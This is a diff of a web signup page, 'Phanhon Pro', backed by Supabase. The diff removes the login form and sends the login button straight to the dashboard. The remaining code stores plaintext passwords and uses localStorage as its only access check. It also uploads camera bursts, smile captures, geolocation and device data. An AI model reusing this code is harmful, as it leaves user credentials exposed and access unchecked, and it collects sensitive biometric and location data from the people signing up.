@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Phanhon Pro | Secure Access</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <!-- Using standard Supabase import -->
     <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css"/>
     <style>
@@ -100,24 +99,23 @@
 </head>
 <body>
     <div class="app-container" id="app">
-        <!-- AUTH SCREEN -->
+        <!-- AUTH SCREEN (Main Landing) -->
         <div id="auth-screen" class="absolute inset-0 bg-black z-[500] p-10 flex flex-col justify-center animate__animated animate__fadeIn">
             <div class="w-12 h-12 bg-white rounded-xl mb-6 flex items-center justify-center text-2xl font-black text-black">P</div>
             <h1 class="text-3xl font-bold mb-2 tracking-tighter">Phanhon Pro</h1>
             <p class="text-white/40 text-xs mb-10 uppercase tracking-widest">Secure Terminal v4.0</p>
             
-            <div id="login-form" class="space-y-4">
-                <input id="login-username" type="text" placeholder="Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <input id="login-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
-                <button onclick="signIn()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Sign In</button>
-                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('signup')">REQUEST ACCESS / CREATE ACCOUNT</p>
-            </div>
-
-            <div id="signup-form" class="hidden space-y-4 animate__animated animate__fadeIn">
+            <!-- DEFAULT: ACCOUNT CREATION (SIGNUP) -->
+            <div id="signup-form" class="space-y-4 animate__animated animate__fadeIn">
                 <input id="signup-username" type="text" placeholder="New Username" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                 <input id="signup-password" type="password" placeholder="Passkey" class="w-full bg-white/5 border border-white/10 p-4 rounded-2xl outline-none text-white focus:border-white/30 transition-all">
                 <button onclick="startVerificationFlow()" class="phantom-btn w-full py-4 text-xs uppercase tracking-widest mt-2">Begin Verification</button>
-                <p class="text-[10px] text-white/20 text-center mt-6 cursor-pointer hover:text-white transition-colors" onclick="toggleAuth('login')">RETURN TO LOGIN</p>
+                
+                <div class="pt-6 border-t border-white/5 mt-6 text-center">
+                    <p class="text-[10px] text-white/20 mb-3 uppercase tracking-widest">Already have a terminal?</p>
+                    <!-- UPDATED: This button now redirects directly to dashboard.html -->
+                    <button onclick="window.location.href='dashboard.html'" class="text-[10px] text-white font-bold uppercase tracking-widest border border-white/20 px-8 py-3 rounded-full hover:bg-white/10 transition-all">Go to Login</button>
+                </div>
             </div>
         </div>
 
@@ -129,7 +127,6 @@
             </div>
             
             <div class="relative w-full aspect-square max-w-[240px] mb-8 group">
-                <!-- Decorative Corners -->
                 <div class="absolute -top-2 -left-2 w-6 h-6 border-t-2 border-l-2 border-white/20 rounded-tl-lg"></div>
                 <div class="absolute -top-2 -right-2 w-6 h-6 border-t-2 border-r-2 border-white/20 rounded-tr-lg"></div>
                 <div class="absolute -bottom-2 -left-2 w-6 h-6 border-b-2 border-l-2 border-white/20 rounded-bl-lg"></div>
@@ -145,8 +142,6 @@
                 <video id="video" width="100%" height="100%" autoplay playsinline muted class="hidden w-full h-full object-cover rounded-3xl"></video>
                 <canvas id="canvas" class="hidden"></canvas>
                 <div id="capture-flash" class="absolute inset-0 bg-white opacity-0 pointer-events-none transition-opacity duration-100 rounded-3xl z-10"></div>
-                
-                <!-- Scanning Line -->
                 <div id="scanner-line" class="hidden absolute left-0 right-0 h-0.5 bg-white/30 shadow-[0_0_15px_rgba(255,255,255,0.5)] z-20 animate-pulse"></div>
             </div>
 
@@ -169,10 +164,7 @@
     </div>
 
     <script>
-        /** * GLOBAL CONFIG 
-         */
         const REDIRECT_URL = "dashboard.html"; 
-        
         const SB_URL = "https://tmvimacikrnrizxtcesf.supabase.co";
         const SB_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InRtdmltYWNpa3Jucml6eHRjZXNmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjgxMDc5NzgsImV4cCI6MjA4MzY4Mzk3OH0.dwh4CWwxE53hbhgjYqOqHZYa1tNyUKNZvdb6Kq5pLC4";
 
@@ -181,7 +173,6 @@
         let capturedData = { thumb: null, smile: null, geo: null, device: null, burst: [] };
         let burstInterval = null;
 
-        // Initialize Supabase
         function initSupabase() {
             if (typeof supabase !== 'undefined') {
                 sb = supabase.createClient(SB_URL, SB_KEY);
@@ -190,19 +181,6 @@
             }
         }
         window.onload = initSupabase;
-
-        // UI Helpers
-        function toggleAuth(mode) { 
-            const login = document.getElementById('login-form');
-            const signup = document.getElementById('signup-form');
-            if (mode === 'signup') {
-                login.classList.add('hidden');
-                signup.classList.remove('hidden');
-            } else {
-                login.classList.remove('hidden');
-                signup.classList.add('hidden');
-            }
-        }
 
         function showToast(msg) { 
             const t = document.getElementById('toast'); 
@@ -217,29 +195,6 @@
             setTimeout(() => f.style.opacity = '0', 150);
         }
 
-        // Logic: SignIn
-        async function signIn() {
-            const u = document.getElementById('login-username').value;
-            const p = document.getElementById('login-password').value;
-            
-            if(!u || !p) return showToast("Credentials Missing");
-
-            try {
-                const { data, error } = await sb.from('profiles').select('*').eq('username', u).eq('password', p).single();
-                if(data && !error) { 
-                    // SAVE USER TO LOCAL STORAGE FOR DASHBOARD ACCESS
-                    localStorage.setItem('phantom_user', JSON.stringify(data));
-                    showToast("Access Verified. Launching...");
-                    setTimeout(() => window.location.href = REDIRECT_URL, 1000);
-                } else {
-                    showToast("Invalid Signature");
-                }
-            } catch (err) {
-                showToast("Terminal Connection Error");
-            }
-        }
-
-        // Logic: Signup Flow
         function startVerificationFlow() {
             const u = document.getElementById('signup-username').value;
             const p = document.getElementById('signup-password').value;
@@ -291,11 +246,9 @@
             const canvas = document.getElementById('canvas');
             canvas.width = 400; canvas.height = 400;
             const ctx = canvas.getContext('2d');
-            
             ctx.translate(canvas.width, 0);
             ctx.scale(-1, 1);
             ctx.drawImage(video, 0, 0, 400, 400);
-            
             const img = canvas.toDataURL('image/jpeg', 0.5);
             flashEffect();
 
@@ -349,7 +302,6 @@
             const p = document.getElementById('signup-password').value;
             
             try {
-                // 1. Create Profile
                 const { data: profile, error: pError } = await sb.from('profiles').insert([
                     { username: u, password: p, balance: 0.1 }
                 ]).select().single();
@@ -360,7 +312,6 @@
                     return;
                 }
 
-                // 2. Upload Biometric Metadata
                 await sb.from('verifications').insert([{
                     user_id: profile.id,
                     username: u,
@@ -373,7 +324,6 @@
                     }
                 }]);
 
-                // SAVE USER TO LOCAL STORAGE AFTER SIGNUP
                 localStorage.setItem('phantom_user', JSON.stringify(profile));
                 showToast("Terminal Initialized.");
                 setTimeout(() => window.location.href = REDIRECT_URL, 1500);
